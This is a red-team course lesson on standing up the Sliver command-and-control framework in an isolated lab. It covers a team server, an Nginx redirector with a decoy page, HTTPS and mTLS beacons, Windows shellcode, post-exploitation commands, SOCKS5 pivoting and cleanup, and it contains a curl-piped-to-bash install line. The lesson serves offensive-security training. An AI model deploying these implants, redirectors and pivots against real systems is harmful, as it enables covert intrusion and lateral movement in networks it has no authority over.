---
title: "C2 Lab — Deploy Sliver with Redirectors, Establish Beacons"
tags: [red-team, C2, Sliver, lab, beacon, redirectors, implant, HTTPS, mTLS]
module: 08-RedTeam-01
day: 493
related_topics:
  - C2 Infrastructure Design (Day 492)
  - AV and EDR Evasion Concepts (Day 494)
  - C2 Concepts and Sliver Lab (Day 242)
---

# Day 493 — C2 Lab: Deploy Sliver with Redirectors, Establish Beacons

> "A C2 server you have never operated under pressure is a liability,
> not an asset. Every option, every command, every failure mode needs
> to be muscle memory before you are inside a real client network.
> Build it. Break it. Build it again. Now you own it."
>
> — Ghost

---

## Goals

Deploy a Sliver C2 team server in an isolated lab.
Configure a redirector (socat or Nginx) in front of the team server.
Generate HTTPS and mTLS implants.
Establish a beacon, interact with it, and perform basic post-exploitation tasks.

**Prerequisites:** Day 492 (C2 design), Day 242 (Sliver intro), Linux server admin.
**Time budget:** 6 hours.

---

## Part 1 — Lab Architecture

```
┌─────────────────────────────────────────────────────┐
│                  Lab Network (host-only)             │
│                                                     │
│  Operator VM          Redirector VM     Team Server VM │
│  192.168.100.10  →→→  192.168.100.20  →→→  192.168.100.30 │
│  (Kali / Ubuntu)      (Ubuntu, socat)    (Ubuntu, Sliver) │
│                                                     │
│                     Victim VM                       │
│                  192.168.100.50                     │
│                  (Ubuntu / Windows)                 │
└─────────────────────────────────────────────────────┘
All VMs: host-only network adapter only. No internet access.
```

---

## Part 2 — Team Server Setup (Sliver)

```bash
# On Team Server VM (192.168.100.30)

# Install Sliver
curl https://sliver.sh/install | sudo bash

# Or manual install:
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -O /usr/local/bin/sliver-server
chmod +x /usr/local/bin/sliver-server

# Start the server
sudo sliver-server &
# Default: listens on 31337/tcp for operator connections (mTLS)
# First run generates operator config + server certs

# Generate operator config for the operator VM:
sliver-server operator --name ghost --lhost 192.168.100.30 --save /tmp/ghost.cfg
# Transfer ghost.cfg to Operator VM
```

---

## Part 3 — Redirector Setup (Nginx)

```bash
# On Redirector VM (192.168.100.20)
sudo apt install nginx -y

# /etc/nginx/sites-available/c2-redirector
server {
    listen 443 ssl;
    server_name _;

    # Self-signed cert for lab (use Let's Encrypt in real ops)
    ssl_certificate     /etc/ssl/certs/ssl-cert-snakeoil.pem;
    ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;

    # Forward only beacon URIs to team server
    location /api/v2/ {
        proxy_pass https://192.168.100.30:8443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    # Everything else: decoy response
    location / {
        return 200 '<!DOCTYPE html><html><body>OK</body></html>';
        add_header Content-Type text/html;
    }
}
```

```bash
sudo ln -s /etc/nginx/sites-available/c2-redirector /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx
```

---

## Part 4 — Operator Connection and Listeners

```bash
# On Operator VM
# Install Sliver client
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux -O /usr/local/bin/sliver
chmod +x /usr/local/bin/sliver

# Connect to team server using the operator config
sliver import ghost.cfg
sliver

# In the Sliver console:
sliver > version              # confirm connection

# Create an HTTPS listener on the team server (direct, lab only)
sliver > https --lhost 192.168.100.30 --lport 8443

# Create an HTTPS listener via redirector
sliver > https --lhost 192.168.100.20 --lport 443 \
         --domain lab-c2.local
```

---

## Part 5 — Generate Implants

### HTTPS Beacon (Staged — small stager)

```bash
sliver > generate beacon \
    --http 192.168.100.20 \
    --os linux \
    --arch amd64 \
    --format elf \
    --save /tmp/beacon_linux

# Beacon properties:
# --sleep 30: check in every 30 seconds
# --jitter 10: ± 10% jitter (reduces timing-based detection)
sliver > generate beacon \
    --http 192.168.100.20 \
    --sleep 30 \
    --jitter 10 \
    --os linux \
    --arch amd64 \
    --save /tmp/beacon_linux_slow
```

### mTLS Implant (Mutual TLS — more secure, detectable by DPI)

```bash
sliver > generate \
    --mtls 192.168.100.30 \
    --os linux \
    --arch amd64 \
    --save /tmp/implant_mtls
```

### Windows Shellcode (for payload injection later)

```bash
sliver > generate beacon \
    --http 192.168.100.20 \
    --os windows \
    --arch amd64 \
    --format shellcode \
    --save /tmp/beacon_shellcode.bin
```

---

## Part 6 — Execute and Catch a Beacon

```bash
# On Victim VM (192.168.100.50) — assume you have shell access via other means
chmod +x /tmp/beacon_linux
/tmp/beacon_linux &

# On Operator VM — watch for callbacks:
sliver > sessions       # list active sessions
sliver > beacons        # list active beacons (async)

# Interact with a beacon:
sliver > use <beacon_id>

# Basic enumeration (queued tasks — beacon executes on next check-in):
[beacon] > whoami
[beacon] > hostname
[beacon] > getuid
[beacon] > pwd
[beacon] > ls /
[beacon] > ps         # list running processes
[beacon] > netstat    # network connections

# Wait for next check-in, then:
[beacon] > results    # retrieve task results
```

---

## Part 7 — Interactive Session vs Beacon

Sliver supports both models:

| Mode | Check-in | Interactivity | Detection risk |
|---|---|---|---|
| **Beacon** (async) | Fixed interval | Commands queued, results batch-returned | Lower — sporadic traffic |
| **Session** (sync) | Persistent connection | Interactive like SSH | Higher — continuous traffic |

```bash
# Open interactive session from a beacon:
[beacon] > interactive
# Sliver opens a real-time session

[session] > shell       # drop to a shell (high noise — avoid)
[session] > execute -o "id"   # execute and capture (lower noise)
[session] > upload /local/file /remote/path
[session] > download /remote/file /local/path
```

**Ghost's rule:** Use beacons for stealth operations. Sessions only when
speed is essential and detection risk is acceptable.

---

## Part 8 — Pivoting Through a Beacon

When you need to reach a host that can only be accessed from the victim:

```bash
# Add a SOCKS5 proxy through the beacon
[beacon] > socks5 start --host 127.0.0.1 --port 1080

# On operator VM: route tools through the pivot
proxychains nmap -sT -p 22,80,443,3389 192.168.100.100

# Or: port forward a specific port
[beacon] > portfwd add --remote 192.168.100.100:3389 --bind 127.0.0.1:13389
# Then: rdesktop 127.0.0.1:13389
```

---

## Part 9 — Cleanup and Operational Notes

```bash
# Kill a beacon remotely:
[beacon] > exit     # sends exit command; beacon terminates on next check-in

# Remove all sessions/beacons:
sliver > sessions --kill-all

# Wipe implant artifacts on victim (manual — log what you dropped):
[session] > rm /tmp/beacon_linux
[session] > rm -rf /tmp/.sliver-*

# Verify nothing was left:
[session] > find /tmp -newer /tmp/reference_file 2>/dev/null
```

**Documentation requirement:** Log every file dropped, every command run, and
the exact timestamp. This is the activity log for the red team report.

---

## Key Takeaways

1. Sliver is a full-featured open-source C2. Learn it deeply — it is what you
   will use in the absence of a Cobalt Strike licence.
2. Beacons (async) are stealthier than interactive sessions. Default to beacons
   unless real-time interaction is essential.
3. The redirector Nginx config is the difference between professional infrastructure
   and a traceable VPS. Non-beacon traffic must never reach the team server.
4. SOCKS5 proxying through a beacon enables lateral movement to hosts unreachable
   from the internet. This is how you move through segmented networks.
5. Log everything. Time-stamped activity logs are required for the report and
   for legal protection if the engagement is questioned.

---

## Exercises

1. Build the full lab: team server + redirector + victim. Establish a beacon.
   Run `whoami`, `hostname`, `ps`. Retrieve the results. Record the timestamp
   of every action.
2. Modify the Nginx redirector to filter on both URI pattern AND User-Agent.
   Confirm that `curl -v https://redirector-ip/` returns the decoy response
   and that only beacon-formatted requests reach the team server.
3. Create a Windows shellcode implant. Write a simple C shellcode runner that
   executes it in a new thread. Confirm the beacon calls back in a Windows VM.
4. Establish a SOCKS5 proxy through a Linux beacon. Use proxychains to run
   `nmap -sT -p 22,80,443 <internal_target>`. Confirm the scan appears in the
   victim's network traffic, not the operator's.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q493.1, Q493.2 …).

---

## Navigation

← Previous: [Day 492 — C2 Infrastructure Design](DAY-0492-C2-Infrastructure-Design.md)
→ Next: [Day 494 — AV and EDR Evasion Concepts](DAY-0494-AV-and-EDR-Evasion-Concepts.md)
